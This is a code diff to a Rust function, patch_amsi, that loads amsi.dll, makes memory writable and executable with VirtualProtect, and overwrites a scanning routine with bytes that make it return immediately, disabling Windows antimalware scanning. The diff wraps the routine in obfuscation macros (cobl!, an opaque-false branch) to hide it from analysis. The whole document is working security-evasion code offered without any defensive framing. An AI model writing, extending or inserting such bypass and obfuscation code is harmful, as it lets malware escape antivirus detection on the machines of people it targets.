@@ -1,9 +1,16 @@
+use encstr::{cobl, opaque_false};
 use std::ffi::CString;
-use windows::core::PCSTR;
 use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
-use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
+use windows::Win32::System::Memory::{
+    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VirtualProtect,
+};
+use windows::core::PCSTR;
 
 pub fn patch_amsi() {
+    cobl!({
+    if opaque_false() {
+        return;
+    }
     let dll_name = match CString::new("amsi.dll") {
         Ok(n) => n,
         Err(_) => return,
@@ -35,19 +42,9 @@ pub fn patch_amsi() {
         let mut old_protect = PAGE_PROTECTION_FLAGS(0);
 
         let patch = if cfg!(target_pointer_width = "64") {
-            &[
-                0x31u8,
-                0xc0u8,
-                0xc3u8,
-            ] as &[u8]
+            &[0x31u8, 0xc0u8, 0xc3u8] as &[u8]
         } else {
-            &[
-                0x31u8,
-                0xc0u8,
-                0xc2u8,
-                0x08u8,
-                0x00u8,
-            ] as &[u8]
+            &[0x31u8, 0xc0u8, 0xc2u8, 0x08u8, 0x00u8] as &[u8]
         };
 
         if VirtualProtect(
@@ -67,4 +64,5 @@ pub fn patch_amsi() {
             );
         }
     }
+    })
 }
